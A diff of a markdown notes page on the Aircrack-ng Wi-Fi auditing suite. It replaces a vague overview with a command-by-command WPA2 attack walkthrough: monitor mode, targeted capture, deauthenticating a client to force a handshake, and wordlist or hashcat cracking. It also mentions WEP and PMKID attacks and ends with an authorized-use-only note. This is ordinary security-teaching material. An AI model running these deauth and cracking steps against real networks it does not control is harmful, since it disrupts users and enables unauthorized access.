@@ -1,22 +1,56 @@
 # Aircrack-ng
-Aircrack-ng is a powerful tool used for assessing the security of Wi-Fi networks. It's primarily employed for testing the security of wireless networks and for recovering keys of secured Wi-Fi networks. Despite its robust capabilities, it's essential to understand its usage responsibly and ethically, as it can be misused for illegal activities.
 
-Here's a breakdown of Aircrack-ng in simpler terms:
+Aircrack-ng is a **Wi-Fi security auditing suite**. The classic use is capturing a WPA/WPA2 4-way handshake and cracking the passphrase offline with a wordlist. It needs a wireless adapter that supports **monitor mode and packet injection** (e.g. Alfa AWUS036 chipsets).
 
-Aircrack-ng is a suite of tools specifically designed to assess the security of Wi-Fi networks. It's popularly used by security professionals, network administrators, and enthusiasts to identify vulnerabilities in wireless networks and to ensure they are adequately protected against unauthorized access.
+## The suite (main binaries)
 
-Here's a breakdown of some key features and concepts in Aircrack-ng:
-- Wireless Packet Capture: Aircrack-ng can capture data packets transmitted over Wi-Fi networks. This allows users to analyze the traffic and understand the patterns of communication within the network.
+- **airmon-ng** - enable/disable monitor mode
+- **airodump-ng** - capture packets / discover networks and clients
+- **aireplay-ng** - inject packets (deauth to force a handshake)
+- **aircrack-ng** - crack WEP/WPA handshakes
+- **airbase-ng** - create rogue APs
 
-- Packet Injection: It can inject custom packets into a Wi-Fi network. This feature is useful for testing the resilience of a network against various attacks, as well as for simulating network traffic for analysis.
+## Full WPA2 handshake capture + crack
 
-- WEP and WPA/WPA2 Cracking: Aircrack-ng is capable of cracking the encryption keys used to secure Wi-Fi networks. It supports both older WEP (Wired Equivalent Privacy) and newer WPA/WPA2 (Wi-Fi Protected Access) security protocols.
+```bash
+# 1. Put the card into monitor mode (kill interfering processes first)
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0            # creates wlan0mon
 
-- Dictionary Attacks: It can perform dictionary attacks against Wi-Fi passwords. This involves trying a list of commonly used passwords or words from a dictionary to attempt to gain unauthorized access to the network.
+# 2. Discover networks - note the BSSID and CHANNEL of the target
+sudo airodump-ng wlan0mon
 
-- Brute Force Attacks: Aircrack-ng can also conduct brute force attacks, where it systematically tries every possible combination of characters to guess the Wi-Fi password. This method is more time-consuming but can be effective against weak passwords.
+# 3. Focus capture on the target AP + channel, write to file
+sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
 
+# 4. Deauth a connected client to force a re-handshake (new terminal)
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+#    Watch for "WPA handshake: AA:BB:.." in the airodump window
 
-While Aircrack-ng can be a valuable tool for testing the security of Wi-Fi networks, it's essential to use it responsibly and ethically.
+# 5. Crack the captured handshake with a wordlist
+aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
 
-In summary, Aircrack-ng is a powerful tool for assessing Wi-Fi network security, but it should be used responsibly and ethically. Understanding its capabilities and limitations is essential for ensuring that it's used for legitimate purposes and contributes positively to cybersecurity efforts.
+# 6. Restore normal networking
+sudo airmon-ng stop wlan0mon
+```
+
+## Notes on cracking
+
+- WPA/WPA2-PSK is only crackable **offline against the handshake** - success depends entirely on the wordlist. Strong passphrases won't fall.
+- For GPU speed, convert and crack with hashcat:
+
+```bash
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+hashcat -m 22000 hash.hc22000 rockyou.txt
+```
+
+- **WEP** is broken and crackable in minutes by collecting enough IVs (`aircrack-ng` on the .cap directly).
+- **PMKID** attack can grab a hash without any client (`hcxdumptool`).
+
+## Legal / ethical
+
+Only test networks you **own or are explicitly authorized** to assess. Deauth attacks disrupt real users and are illegal against networks you don't control.
+
+## Resources
+
+- [Aircrack-ng documentation](https://www.aircrack-ng.org/documentation.html)
